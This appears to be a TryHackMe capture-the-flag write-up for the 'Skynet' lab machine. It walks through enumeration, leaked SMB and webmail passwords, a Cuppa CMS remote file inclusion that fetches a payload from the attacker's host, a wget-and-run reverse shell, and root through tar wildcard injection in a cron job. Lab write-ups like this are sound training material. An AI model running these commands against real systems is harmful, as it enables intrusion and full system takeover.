---
title: Skynet WriteUp
description: A vulnerable Terminator themed Linux machine.
tags:
- writeups
- tryhackme
- linux
---
## Enumeration

TryHackMe provides very little info so will just jump in.

Initial port scan

```bash
sudo nmap -sV 10.10.59.216
```

Results:
```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Of note:

* OpenSSH 7.2 is potentially vulnerable to User enumeration via linux/remote/45939.py
* Webserver on port 80
* Samba shares

### Web Enumeration
Started enumerating web page with
```bash
gobuster dir -u http://10.10.59.216 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
Output:
```
/admin                (Status: 301) [Size: 312] [--> http://10.10.59.216/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.59.216/css/]  
/js                   (Status: 301) [Size: 309] [--> http://10.10.59.216/js/]   
/config               (Status: 301) [Size: 313] [--> http://10.10.59.216/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.59.216/ai/]    
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.59.216/squirrelmail/]
```
Which discovered `/squirrelmail` which was running version 1.4.23

### SMB Enumeration

Enumerated shares with
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.59.216
```

Of interest are `anonymous` with anonymous read/write and `milesdyson` which we dont have privs for

In the anonymous share was a note `attention.txt` and logs folder
```text
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Logs folder contained 3 files log1.txt log2.txt and log3.txt. 2 and 3 were empty but 1 contained a list of passwords.

```text
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

## Webmail Access

Given the private smb share was called `milesdyson` I guessed this might be a username.

I was about to use the password list to password spray the squirrelmail webmail, but when I tried the first password
`cyborg007haloterminator` it worked so I left it there.

The user had 3 emails in the inbox

Email 1
```text
From:  	serenakogan@skynet
Subject:  	
Date:  	Tue, September 17, 2019 3:13 am
To:  	

i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```

Email 2
```text
From:  	serenakogan@skynet
Subject:  	
Date:  	Tue, September 17, 2019 3:16 am
To:

01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```

Email 3
```text
From:  	skynet@skynet
Subject:  	Samba Password reset
Date:  	Tue, September 17, 2019 10:10 pm
To:  	

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Using this password to access the milesdyson share over SMB worked (username `milesdyson`)

This revealed a folder with multiple PDFs about AI/ML and a subdirectory called notes.

Given an HTTP folder called /ai was found by gobuster, I checked if it was serving this directory by going to /ai/notes in the browser.

This gave an HTTP redirect to /ai/notes/ and gives 403 which is different behaviour from say /ai/something which just gives 404 

The notes directory contained a file called `important.txt` which hinted at a beta CMS located at `/45kra24zxs28v3yd`

So I started gobustering the location which found `/administrator` which showed that it was running `cuppa cms`.

Some googling found a file inclusion vulnerability in cuppa cms (https://www.exploit-db.com/exploits/25971)

Used msfvenom to make a meterpreter shell and staged with a PHP reverse shell.

```bash
curl http://10.10.59.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.32.196:8000/payload.php?
```
In shell
```bash
wget http://10.4.32.196:8000/shell.elf -O /tmp/shell
chmod +x /tmp/shell
/tmp/shell &
```

Used LinEnum.sh to search for issues https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Found crontab runs every minute
```text
/home/milesdyson/backups/backup.sh
```

**backup.sh** contents
```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
This is vulnerable to wildcard hijacking (https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

To exploit, create a file `/var/www/html/script.sh` with
```bash
#!/bin/bash
/tmp/shell &
```
From meterpreter open a shell and run
```bash
cd /var/www/html
touch './--checkpoint-action=exec=bash script.sh'
touch './--checkpoint=1'
```
Enjoy the root shell!
```bash
cat /root/root.txt
```
